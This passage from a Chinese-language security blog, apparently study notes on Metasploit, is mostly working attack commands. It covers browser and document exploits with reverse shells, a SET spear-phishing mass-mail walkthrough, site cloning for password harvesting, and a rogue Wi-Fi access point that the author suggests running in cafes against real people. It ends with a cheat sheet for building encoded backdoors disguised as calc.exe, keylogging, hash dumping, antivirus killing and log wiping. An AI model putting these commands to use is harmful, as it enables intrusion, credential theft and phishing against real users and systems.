<li><p>主要指利用多种途径包括社会工程学方式攻击目标机器上安装的带有漏洞的程序如浏览 <br>器，pdf 阅读器，office 软件等，最终获取系统权限。 <br>基于浏览器的攻击： <br>例子： <br>msf&gt; use windows&#x2F;browser&#x2F;ms10_002_aurora <br>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp <br>set SRVPORT 80 <br>set URIPATH &#x2F; <br>set LHOST 192.168.1.111 <br>set LPORT 443 <br>exploit –z <br>sessions –i 1 <br>run migrate <br>或者: <br>msf&gt; use windows&#x2F;browser&#x2F;ms10_002_aurora <br>show advanced <br>set ReverseConnectRetries 10 <br>set AutoRunScript migrate –f <br>exploit <br>use priv <br>getsystem</p>
</li>
<li><p>文件格式exploit <br>利用文件格式的漏洞达到溢出的目的，比如PDF，word，图片等。 <br>例子： <br>msf&gt; use windows&#x2F;fileformat&#x2F;ms11_006_createsizeddibsection <br>info <br>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp <br>set LHOST 192.168.1.111 <br>set LPORT 443 <br>exploit <br>此时会生成一个msf.doc 的word 文档，在目标机器上打开此文档，然后本机监听端口 <br>等待反弹连接： <br>use multi&#x2F;handler <br>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp <br>set LHOST 192.168.1.111 <br>set LPORT 443 <br>exploit –j</p>
</li>
</ol>
<h1 id="MSF-附加模块"><a href="#MSF-附加模块" class="headerlink" title="MSF 附加模块"></a>MSF 附加模块</h1><p>包括端口扫描，服务探测，弱口令探测，fuzzer，sql 注射等。附加模块没有payload。 <br>模块保存在&#x2F;opt&#x2F;framework3&#x2F;msf3&#x2F;modules&#x2F;auxiliary&#x2F;目录中的各个子目录下。 <br>可用命令查看全部可用附加模块：msf&gt; show auxiliary <br>例子： <br>msf&gt; use scanner&#x2F;http&#x2F;webdav_scanner <br>info <br>show options <br>set RHOSTS 192.168.1.141,192.168.1.142,192.168.2.222 <br>run <br>搜索所有http 相关扫描模块： <br>search scanner&#x2F;http <br>附加模块深层剖析： <br>cd &#x2F;opt&#x2F;framework3&#x2F;msf3&#x2F;modules&#x2F;auxiliary&#x2F;admin&#x2F; <br>wget <br><a target="_blank" rel="noopener external nofollow noreferrer" href="http://carnal0wnage.googlecode.c/">http://carnal0wnage.googlecode.c</a> … admin&#x2F;random&#x2F;foursq <br>ueare.rb <br>代码分析: <br>require ‘msf&#x2F;core’ <br>class Metasploit3 &lt; Msf::Auxiliary #导入Auxiliaary 类 <br>#Exploit mixins should be called first <br>include Msf::Exploit::Remote::HttpClient #导入HTTPClient 方法 <br>include Msf::Auxiliary::Report <br>def initialize <br>super( <br>‘Name’ &#x3D;&gt; ‘Foursquare Location Poster’, <br>‘Version’ &#x3D;&gt; ‘Revision:’, <br>‘Description’ &#x3D;&gt; ‘F*ck with Foursquare,be anywhere you want to be by venue <br>id’, <br>‘Author’ &#x3D;&gt; [‘CG’], <br>‘License’ &#x3D;&gt; MSF_LICENSE, <br>‘References’ &#x3D;&gt; <br>[ <br>[‘URL’,’<a target="_blank" rel="noopener external nofollow noreferrer" href="http://groups.google.com/group/foursquare-api%E2%80%99/]">http://groups.google.com/group/foursquare-api’\]</a>, <br>[‘URL’,’<a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.mikekey.com/im-a-foursquare-cheater/%E2%80%99/]">http://www.mikekey.com/im-a-foursquare-cheater/’\]</a>, <br>] <br>#todo pass in geocoords instead of venueid,create a venueid, other tom foolery <br>register_options( <br>[ <br>Opt::RHOST(‘api.foursquare.com’), <br>OptString.new(‘VENUEID’,[true,’foursquare venueid’,’185675’]), <br>OptString.new(‘USERNAME’,[true,’foursquare username’,’username’]), <br>OptString.new(‘PASSWORD’,[true,’foursquare password’,’password’]), <br>],self.class) <br>end <br>def run <br>begin <br>user &#x3D; datastore[‘USERNAME’] <br>pass &#x3D; datasore[‘PASSWORD’] <br>venid &#x3D; datastore[‘VENUEID’] <br>user_pass &#x3D; Rex::Text.encode_base64(user + “:” + pass) <br>decode &#x3D; Rex::Text.decode_base64(user_pass) <br>postrequest &#x3D; “twitter&#x3D;1\n” #add facebook&#x3D;1 if you want facebook <br>print_status(“Base64 Encode User&#x2F;Pass: #{user_pass}”) #debug <br>print_status(“Base64 Decode User&#x2F;Pass: #{decode}”) #debug <br>res &#x3D; send_request_cgi({ <br>‘uri’ &#x3D;&gt; “&#x2F;v1&#x2F;checkin?vid&#x3D;#{venid}”, <br>‘version’ &#x3D;&gt; “1.1”, <br>‘method’ &#x3D;&gt; ‘POST’, <br>‘data’ &#x3D;&gt; postrequest, <br>‘headers’ &#x3D;&gt; <br>{ <br>‘Authorization’ &#x3D;&gt; “Basic #{user_pass}”, <br>‘Proxy-Connection’&#x3D;&gt; “Keep-Alive”, <br>} <br>},25) <br>print_status(“#{res}”) <br>end <br>rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout <br>rescue ::Timeout::Error, ::Errno::EPIPE &#x3D;&gt;e <br>pus e.message <br>end <br>end <br>ruby 白痴一个，代码我也没看懂，不解释了 <br>如何使用： <br>msf&gt; search foursquare <br>msf&gt; use admin&#x2F;foursquare <br>set VENUEID 2584421 <br>set USERNAME <a href="mailto:&#109;&#115;&#102;&#x40;&#101;&#x6c;&#119;&#x6f;&#x6f;&#x64;&#46;&#x6e;&#101;&#116;" rel="external nofollow noreferrer">&#109;&#115;&#102;&#x40;&#101;&#x6c;&#119;&#x6f;&#x6f;&#x64;&#46;&#x6e;&#101;&#116;</a> <br>set PASSWORD ilovemetasploit <br>run</p>
<h1 id="社会工程学工具集（SET）"><a href="#社会工程学工具集（SET）" class="headerlink" title="社会工程学工具集（SET）"></a>社会工程学工具集（SET）</h1><p>主要功能：hacking the human mind。   </p>
<ol>
<li><p>SET 基本配置： <br>SET 位于&#x2F;pentest&#x2F;exploits&#x2F;set&#x2F;目录 <br>更新： <br>cd &#x2F;pentest&#x2F;exploits&#x2F;set&#x2F; <br>svn update <br>配置文件config&#x2F;set_config，当使用基于web 的攻击方式时可以将email 功能打开： <br>vi config&#x2F;set_config: <br>METASPLOIT_PATH&#x3D;&#x2F;opt&#x2F;framework3&#x2F;msf3 <br>WEBATTACK_EMAIL&#x3D;ON <br>使用Java applet attack 进行攻击的时候默认使用Microsoft 作为发布者名称，如果需要自定义则需要安装JDK 并打开配置项： <br>SELF_SIGNED_APPLET&#x3D;ON <br>SET 默认打开AUTO_DETECT 项，自动探测本机IP 并用于攻击中的各项配置。如果本机是多网卡需要手动指定IP，则需将此项关闭： <br>AUTO_DETECT&#x3D;OFF <br>SET 默认使用内建的python 提供的web server 供使用，如需使用apache 作为服务则需要本机安装apache 并打开配置项： <br>APACHE_SERVER&#x3D;ON</p>
</li>
<li><p>网络钓鱼攻击（Spear-Phishing Attack Vector）： <br>利用文件格式漏洞（如PDF）等生成后门并通过email（GMAIL,SENDMAIL,）向目标发送带后门附件的电子邮件，诱使目标打开附件激活后门。 <br>例子： <br>.&#x2F;set <br>此时选择菜单1.Spear-Phishing Attack Vectors <br>继续选择：1.Perform a Mass Email Attack <br>选择exploit：8.Adobe Collab.collectEmailInfo Buffer Overflow <br>选择payload：4.Windows Reverse TCP Shell <br>选择是否更改文件名：1.Keep the filename <br>选择发送邮件方式1.Email Attack Single Email Address <br>选择邮件模板1.Pre-Defined Template <br>5.Status Report <br>输入收件方email 地址：<a href="mailto:&#119;&#x65;&#x62;&#109;&#97;&#x6e;&#97;&#103;&#x65;&#114;&#64;&#101;&#120;&#x6d;&#x61;&#x70;&#108;&#101;&#46;&#x63;&#111;&#109;" rel="external nofollow noreferrer">&#119;&#x65;&#x62;&#109;&#97;&#x6e;&#97;&#103;&#x65;&#114;&#64;&#101;&#120;&#x6d;&#x61;&#x70;&#108;&#101;&#46;&#x63;&#111;&#109;</a> <br>选择发件方式：1.Use a GMAIL Account for your email attack <br>输入发件gmail 和密码 <br>选择是否立即监听端口等待连接:yes <br>此时SET 会使用刚才的设定全自动监听指定端口。</p>
</li>
<li><p>WEB 方式攻击： <br>SET 可以克隆一个网站并植入后门以此迷惑目标打开此网站并中招。 <br>Java Applet 方式：最成功的方式之一，并不是利用java 的漏洞，而是当目标浏览含后门的仿冒站点时会被询问是否允许执行web 中的java applet，一旦点击允许则payload 开始运行，目标将被重定向到真实的网站。 <br>用户端（Client-side）web exploit 方式：利用用户端存在的软件漏洞，一般使用0day进行攻击的效果最好。 <br>账号密码获取（Username and Password Harvesting）：通过克隆一个目标站并诱使攻击目标登陆，截获其账号密码。例如截获GMAIL 密码。 <br>标签页绑架（Tabnabbing）：当目标打开多个标签页浏览网站并切换标签页时，网站侦测到目标的行为并显示让目标等待的信息，恰好目标打开了被绑架的标签页并要求在相似程度惊人的网站里输入登陆凭据，当目标输入之后登陆信息即被截获，同时被重定向到真实网站。 <br>中间人攻击（Man-Left-in-the-Middle）：此方式使用已经被攻陷的网站的HTTP 请求或者网站的XSS 漏洞让用户的登陆信息发送至攻击者的HTTP 服务器。如果你发现了一个网站的XSS 漏洞，可以利用此漏洞构造一个url 发送给目标诱使其打开并登陆以截获登陆信息。 <br>Web Jacking：当目标打开我们的网站时会有一个链接显示为正确的web 地址，此时若目标打开此仿冒链接会被定向到我们的仿冒网站，其登陆信息会被截获。 <br>混合模式（multi-attack）：可同时使用以上多种攻击手段以提高成功率。 <br>介质感染攻击（Infectious Media Generator）：可以让你生成一张光盘或者u 盘，里面包含autorun.inf 来运行指定的后门文件或者file-format 漏洞文件。 <br>迷你USB 人机接口设备（Teensy USB HID）：当电脑插入USB 设备且autorun.inf 被禁用时，可使用此方法将USB 设备模拟成一个键盘或鼠标设备，进而截获目标机器的击键记录。 <br>SET 其他特殊功能： <br>包括SET 交互式shell，可用来替代meterpreter；远程管理工具（RATTE）；HTTP 隧道，当目标主机只开放HTTP 端口对外放行时可通过此功能与主机进行通信；WEB-GUI，包含了常用攻击和无线攻击向导，输入.&#x2F;set-web 即可运行。 <br>（SET 新版本变动较大，请自行摸索。）</p>
</li>
</ol>
<h1 id="FAST-TRACK"><a href="#FAST-TRACK" class="headerlink" title="FAST-TRACK"></a>FAST-TRACK</h1><p>Fast-Track 和SET 一样都是python 编写的，同样是使用MSF 提供的payload 以及用户端攻击向导等，作为对MSF 的补充，它提供了如MSSQL 攻击，更多的exploit，浏览器攻击向导等。fasttrack 位于&#x2F;pentest&#x2F;exploits&#x2F;fasttrack&#x2F;。 <br>交互式模式：.&#x2F;fast-track.py -i <br>命令行模式：.&#x2F;fast-track.py -c <br>Web 界面模式：.&#x2F;fast-track.py -g</p>
<ol>
<li><p>MSSQL 工具： <br>MSSQL 注入漏洞攻击： <br>攻击时你只需要输入有注入漏洞的url 地址，地址里面用INJECTHERE 标识可注入字 <br>段，如<a target="_blank" rel="noopener external nofollow noreferrer" href="http://example.com/show.asp?id=INJECTHERE&amp;date=2012%EF%BC%8Cfast-track">http://example.com/show.asp?id=INJECTHERE&amp;date=2012，fast-track</a> 会全自动注入，一旦成功会给你返回一个cmd shell。 <br>注入也支持POST 参数，如果是POST 的话更加简单，只需要你输入url 地址，fast-track会自动判断并尝试进行注入。 <br>SQL 暴力破解：另外一个实用的功能是暴力破解器（MSSQL Bruter），可以寻找mssql弱口令，一旦获取到一个sa 权限的访问权限，将自动返回一个shell。 <br>SQL 注入批量扫描器（SQLPwnage）：此功能可扫描指定网段的所有打开80 端口的主 <br>机，并扫描是否存在sql 注入点，一旦发现注入点将自动尝试攻击并通过xp_cmdshell <br>获取系统权限。</p>
</li>
<li><p>Binary-HEX 转换器： <br>当你已经进入一个系统且需要上传可执行文件上去，就可以使用这个工具将可执行的二进制文件转换为HEX 十六进制编码，然后复制粘贴过去即可。</p>
</li>
<li><p>批量用户端攻击： <br>和浏览器攻击差不多，但是增加了对目标的ARP 缓冲区和DNS 感染（只能是在测试者 <br>和目标处于同一网段的情况下），以及MSF 里面没有的浏览器溢出exploit。当目标浏览 <br>恶意网站的时候，fast-track 尝试着使用所有的exp 对目标机器进行溢出，一旦某个exp <br>起作用将获取到目标机器的控制权限。 <br>（新版本fasttrack 中还加入了Autopwn Automation Nmap Scripting Engine、Exploits、Payload Generator 等新功能。） <br>脚本化的工具有时确实能减少很多工作时间，但是不能完全依赖于这类自动程度很高的 <br>工具，特别是在用这些工具搞不定目标的时候，手工测试的能力往往才是王道，细节决定成败。</p>
</li>
</ol>
<h1 id="KARMERASPLOIT"><a href="#KARMERASPLOIT" class="headerlink" title="KARMERASPLOIT"></a>KARMERASPLOIT</h1><p>Karmetasploit &#x3D; Karma + Metasploit，也可以说成它是MSF 的KARMA 实现。 <br>Karma 和MSF 一样也是使用ruby 语言编写的，其功能是建立一个虚假的无线接入点， <br>等待目标连接上钩。与MSF 结合可实现更强大的功能。Karmetasploit 集成了DNS,POP3， <br>IMAP4，SMTP,FTP,SMB,HTTP 等服务用于攻击，模块位于modules&#x2F;auxiliary&#x2F;server 目录下。 <br>基本配置： <br>需要的配置不多，首先需要配置一个DHCP 服务为目标提供动态IP 分配，配置文件： <br>option domain-name-servers 10.0.0.1; <br>default-lease-time 60; <br>max-lease-time 72; <br>ddns-update-style none; <br>authoritative; <br>log-facility local7; <br>subnet 10.0.0.0 netmask 255.255.255.0 { <br>range 10.0.0.100 10.0.0.254; <br>option routers 10.0.0.1; <br>option domain-name-servers 10.0.0.1;}</p>
<p>将配置文件保存在&#x2F;etc&#x2F;dhcp3&#x2F;dhcpd.conf <br>下一步下载karma msf 脚本： <br>wget <a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.offensive-security.com/downloads/karma.rc">http://www.offensive-security.com/downloads/karma.rc</a> <br>将网卡激活为监听模式： <br>airmon-ng start wlan0 <br>创建伪装接入点,-P 可被扫描到，-C 信号发射速率，-e 接入点名称（需要具有欺骗性）， <br>-v 指定网卡，mon0 为上一步完成后生成的： <br>airbase-ng -P -C 30 -e “China-Net-Free” -v mon0 <br>此时会生成一个名为at0 的新网卡接口。 <br>接着打开DHCP 服务： <br>ifconfig at0 up 10.0.0.1 netmask 255.255.255.0 <br>dhcpd3 -cf &#x2F;etc&#x2F;dhcp3&#x2F;dhcpd.conf at0 <br>检查是否成功启动： <br>ps aux|grep dhcpd <br>tail -f &#x2F;var&#x2F;log&#x2F;messages <br>下一步加载karma 脚本： <br>msf&gt; resource karma.rc <br>等待收获： <br>当对方打开邮件客户端并登陆收取邮件，那么他的账户密码将被截获，因为他所连接的 <br>DNS 和POP3 都是虚假的。 <br>当对方打开浏览器准备浏览网页时karma 开始截取cookie，建立虚假email，DNS 等服 <br>务，加载exploits 来对付客户端浏览器，如果走运的话可以获取到shell。 <br>总结：建议这招可以拿到麦当劳，星巴克用，效果更好。</p>
<h1 id="构建自己的模块，编写自己的exploit，meterpreter脚本编程"><a href="#构建自己的模块，编写自己的exploit，meterpreter脚本编程" class="headerlink" title="构建自己的模块，编写自己的exploit，meterpreter脚本编程"></a>构建自己的模块，编写自己的exploit，meterpreter脚本编程</h1><hr>
<p>这三章留着后面看，需要有ruby 基础等编程基础。</p>
<hr>
<h1 id="渗透实战演习"><a href="#渗透实战演习" class="headerlink" title="渗透实战演习"></a>渗透实战演习</h1><p>首先需要下载并安装一个专门用来练习渗透的虚拟机Metasploitable： <br><a target="_blank" rel="noopener external nofollow noreferrer" href="http://updates.metasploit.com/data/Metasploitable.zip.torrent">http://updates.metasploit.com/data/Metasploitable.zip.torrent</a> <br>虚拟机IP：172.16.32.162 用户名密码：msfadmin <br>WINXP：172.16.32.131 开放80 端口有防火墙 <br>情报收集： <br>nmap -sT -P0 172.16.32.131 <br>msfconsole： <br>cd &#x2F;opt&#x2F;framework3&#x2F;msf3&#x2F; <br>msfconsole <br>msf&gt; use multi&#x2F;handler <br>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp <br>set lhost 172.15.32.129 <br>set lport 443 <br>load auto_add_route <br>exploit -j <br>run getgui -e -f 8080 <br>shell <br>net user msf msf &#x2F;add <br>net localgroup administrators msf &#x2F;add <br>upload nmap.exe <br>nmap.exe -sT -A -P0 172.16.32.162 <br>msf&gt; use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_version <br>set RHOSTS 172.16.32.162 <br>run <br>msf&gt; use auxiliary&#x2F;scanner&#x2F;smtp&#x2F;smtp_version <br>set RHOSTS 172.16.32.162 <br>run <br>search tomcat_mgr_login <br>set rhosts 172.16.32.162 <br>set threads 50 <br>set rport 8180 <br>set verbose false <br>run <br>use multi&#x2F;http&#x2F;tomcat_mgr_deploy <br>set password tomcat <br>set username tomcat <br>set rhost 172.16.32.162 <br>set lport 9999 <br>set rport 8180 <br>set payload linux&#x2F;x86&#x2F;shell_bind_tcp <br>exploit <br>search distcc_exec <br>set payload linux&#x2F;x86&#x2F;shell_reverse_tcp <br>set lhost 172.16.32.129 <br>set rhost 172.16.32.162 <br>show payloads <br>set payload cmd&#x2F;unix&#x2F;reverse <br>exploit</p>
<h1 id="常用命令备忘"><a href="#常用命令备忘" class="headerlink" title="常用命令备忘"></a>常用命令备忘</h1><p>MSFconsole Commands</p>
<p>show exploits 查看所有exploit <br>show payloads 查看所有payload <br>show auxiliary 查看所有auxiliary <br>search name 搜索exploit 等 <br>info 查看加载模块的信息 <br>use name 加载模块 <br>LHOST 本机IP <br>RHOST 目标IP <br>set function 设置选项值 <br>setg function 全局设置 <br>show options 查看选项 <br>show targets 查看exp 可选的平台 <br>set target num 设置exp 作用平台 <br>set payload payload 设置payload <br>show advanced 查看高级选项 <br>set autorunscript migrate -f 设置自动执行指令 <br>check 测试是否可利用 <br>exploit 执行exp 或模块 <br>exploit -j 作为后台执行 <br>exploit -z 成功后不立即打开session <br>exploit -e encoder 指定encoder <br>exploit -h 查看帮助信息 <br>sessions -l -v 列出可用sessions 详细信息 <br>sessions -s script 在指定session 执行脚本 <br>sessions -K 结束session <br>sessions -c cmd 执行指定命令 <br>sessions -u sessionID 升级shell <br>db_create name 创建数据库 <br>db_connect name 连接数据库 <br>db_nmap nmap 扫描并导入结果 <br>db_autopwn -h 查看autopwn 帮助 <br>db_autopwn -p -r -e 基于端口，反弹shell <br>db_destroy 删除数据库</p>
<p>Meterpreter Commands</p>
<p>help 查看帮助 <br>run scriptname 运行脚本 <br>sysinfo 系统基本信息 <br>ls 列目录 <br>use priv 运行提权组件 <br>ps 列进程 <br>migrate PID PID 迁移 <br>use incognito token 窃取 <br>list_tokens -u 查看可用用户token <br>list_tokens -g 查看可用组token <br>impersonate_token DOMAIN_NAME\USERNAME 模仿token <br>steal_token PID 窃取PID 所属token 并模仿 <br>drop_token 停止模仿token <br>getsystem 获取SYSTEM 权限 <br>shell 运行shell <br>execute -f cmd.exe -i 交互式运行cmd <br>execute -f cmd.exe -i -t 使用可用token 运行 <br>execute -f cmd.exe -i -H -t 同上，同时隐藏进程 <br>rev2self 返回至初始用户 <br>reg command 修改注册表 <br>setkesktop number 切换至另一已登录用户屏幕 <br>screenshot 截屏 <br>upload file 上传文件 <br>download file 下载文件 <br>keyscan_start 开始截取击键记录 <br>keyscan_stop 停止截取击键记录 <br>getprivs 尽可能提升权限 <br>uictl enable keyboard&#x2F;mouse 获取键盘或鼠标的控制权 <br>background 将当前meterpreter shell 转入后台 <br>hashdump 导出所有用户hash <br>use sniffer 加载嗅探模块 <br>sniffer_interfaces 查看可用网卡接口 <br>sniffer_dump interfaceID pcapname 开始嗅探 <br>sniffer_start interfaceID packet-buffer 指定buffer 范围嗅探 <br>sniffer_stats interfaceID 抓取统计信息 <br>sniffer_stop interfaceID 停止嗅探 <br>add_user username password -h ip 添加用户 <br>add_group_user “Domain Admins” username -h ip 添加用户至管理组 <br>clearev 清空日志 <br>timestomp 改变文件属性如创建时间等 <br>reboot 重启</p>
<p>MSFpayload Commands</p>
<p>msfpayload -h 查看帮助 <br>msfpayload windows&#x2F;meterpreter&#x2F;bind_tcp 0 <br>查看指定payload 可用选项 <br>msfpayload windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.2 LPORT&#x3D;443 X &gt; <br>payload.exe <br>生成payload.exe <br>msfpayload windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.2 LPORT&#x3D;443 R &gt; <br>payload.raw <br>保存为RAW 格式，可用于msfencode <br>msfpayload windows&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;443 C &gt; payload.c <br>保存为C 格式 <br>msfpayload windows&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;443 J &gt; payload.java <br>保存为java 格式</p>
<p>MSFencode Commands</p>
<p>msfencode -h 查看帮助 <br>msfencode -l 查看可用encoder <br>msfencode -t (c,elf.exe,java.js_le,js_be,perl,raw,ruby,vba,vbs,loop-vbs,asp,war,macho) <br>以指定格式显示编码后的buffer <br>msfencode -i payload.raw -o encoded_payload.exe -e x86&#x2F;shikata_ga_nai -c 5 -t exe <br>生成编码后的exe <br>msfpayload windows&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;443 R | msfencode -e x86&#x2F;countdown -c <br>5 -t raw | msfencode -e x86&#x2F;shikata_ga_nai -c 5 -t exe -o multi-encoded.exe <br>多编码器结合，多次编码 <br>msfencode -i payload.raw BufferRegister&#x3D;ESI -e x86&#x2F;alpha_mixed -t c <br>生成纯字符格式C 类型shellcode</p>
<p>MSFcli Commands</p>
<p>msfcli |grep exploit 只显示exploit <br>msfcli | grep exploit&#x2F;windows 只显示windows exploit <br>msfcli exploit&#x2F;windows&#x2F;smb&#x2F;ms08_067_netapi PAYLOAD&#x3D;windows&#x2F;meterpreter&#x2F;bind_tcp <br>LPORT&#x3D;443 RHOST&#x3D;172.16.32.26 E <br>针对指定IP 加载指定exp 并设定payload</p>
<p>MSF,Ninja，Fu</p>
<p>msfpayload windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.2 LPORT&#x3D;443 R | <br>msfencode -x calc.exe -k -o payload.exe -e x86&#x2F;shikata_ga_nai -c 7 -t exe <br>使用calc.exe 作为模板，生成经过编码的后门 <br>msfpayload windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.2 LPORT&#x3D;443 R | <br>msfencode -x calc,exe -o payload.exe -e x86&#x2F;shikata_ga_nai -c 7 -t exe <br>与上面差不多，只是执行的时候不依赖于生成的可执行文件，且不会有任何提示信息 <br>msfpayload windows&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;443 R | msfencode -o payload.exe <br>-e x86&#x2F;shikata_ga_nai -c 7 -t exe &amp;&amp; msfcli multi&#x2F;hanler <br>PAYLOAD&#x3D;windows&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;443 E <br>生成编码后的payload 并开始监听本机端口</p>
<p>MSFvenom</p>
<p>msfvenom –payload 自动生成payload</p>
<p>Meterpreter Post Exploitation Commands</p>
<p>提权一般步骤 <br>meterpreter&gt; use priv <br>meterpreter&gt; getsystem <br>meterpreter&gt; ps <br>meterpreter&gt; steal_token 1784 <br>meterpreter&gt; shell <br>net user msf msf &#x2F;add &#x2F;DOMAIN <br>net group “Domain Admins” msf &#x2F;add &#x2F;DOMAIN <br>获取hash 一般步骤 <br>meterpreter&gt; use priv <br>meterpreter&gt; getsystem <br>meterpreter&gt; hashdump <br>如果是在win2008 系统上： <br>meterpreter&gt; run migrate <br>meterpreter&gt; run killav <br>meterpreter&gt; ps <br>meterpreter&gt; migrate 1436 <br>meterpreter&gt; keyscan_start <br>meterpreter&gt; keyscan_dump <br>meterpreter&gt; keyscan_stop <br>使用Incognito 提权 <br>meterpreter&gt; use incognito <br>meterpreter&gt; list_tokens -u <br>meterpreter&gt; use priv <br>meterpreter&gt; getsystem <br>meterpreter&gt; list_tokens -u <br>meterpreter&gt; impersonate_token IHAZSECURITY\Administrator <br>查看保护机制并禁用之 <br>meterpreter&gt; run getcountermeasure <br>meterpreter&gt; run getcountermeasure -h <br>meterpreter&gt; run getcountermeasure -d -k <br>检查是否是虚拟机 <br>meterpreter&gt; run checkvm <br>转入命令行 <br>meterpreter&gt; shell <br>远程VNC 控制 <br>meterpreter&gt; run vnc <br>转入后台 <br>meterpreter&gt; background <br>Bypass UAC <br>meterpreter&gt; run post&#x2F;windows&#x2F;escalate&#x2F;bypassuac <br>OS X 系统上dump hash <br>meterpreter&gt; run post&#x2F;osx&#x2F;gather&#x2F;hashdump <br>Linux 系统上dump hash <br>meterpreter&gt; run post&#x2F;linux&#x2F;gather&#x2F;hashdump</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://blog.putdown.top">putdown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.putdown.top/archives/def7eeeb.html">https://blog.putdown.top/archives/def7eeeb.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.putdown.top" target="_blank">Putdownd’s Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/e5925563a436d850cfc6184421b9ec77.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/archives/2f610211.html"><img class="prev-cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">反弹shell</div></div></a></div><div class="next-post pull-right"><a href="/archives/67e3de9c.html"><img class="next-cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">github渗透测试工具库</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%8432%E4%B8%AA%E5%91%BD%E4%BB%A4%E5%BD%92%E7%BA%B3%E5%B0%8F%E7%BB%93"><span class="toc-text">常用的32个命令归纳小结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81background%E5%91%BD%E4%BB%A4"><span class="toc-text">1、background命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81session%E5%91%BD%E4%BB%A4"><span class="toc-text">2、session命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81shell%E5%91%BD%E4%BB%A4"><span class="toc-text">3、shell命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81cat%E5%91%BD%E4%BB%A4"><span class="toc-text">4、cat命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81getwd%E5%91%BD%E4%BB%A4"><span class="toc-text">5、getwd命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81upload%E5%91%BD%E4%BB%A4"><span class="toc-text">6、upload命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81download%E5%91%BD%E4%BB%A4"><span class="toc-text">7、download命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81edit%E5%91%BD%E4%BB%A4"><span class="toc-text">8、edit命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81search%E5%91%BD%E4%BB%A4"><span class="toc-text">9、search命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10%E3%80%81ipconfig%E5%91%BD%E4%BB%A4"><span class="toc-text">10、ipconfig命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11%E3%80%81portfwd%E5%91%BD%E4%BB%A4"><span class="toc-text">11、portfwd命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12%E3%80%81route%E5%91%BD%E4%BB%A4"><span class="toc-text">12、route命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13%E3%80%81getuid"><span class="toc-text">13、getuid</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14%E3%80%81sysinfo"><span class="toc-text">14、sysinfo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15%E3%80%81ps%E5%91%BD%E4%BB%A4"><span class="toc-text">15、ps命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16%E3%80%81migrate"><span class="toc-text">16、migrate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17%E3%80%81execute%E5%91%BD%E4%BB%A4"><span class="toc-text">17、execute命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18%E3%80%81getpid"><span class="toc-text">18、getpid</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19%E3%80%81shutdown%E5%91%BD%E4%BB%A4"><span class="toc-text">19、shutdown命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 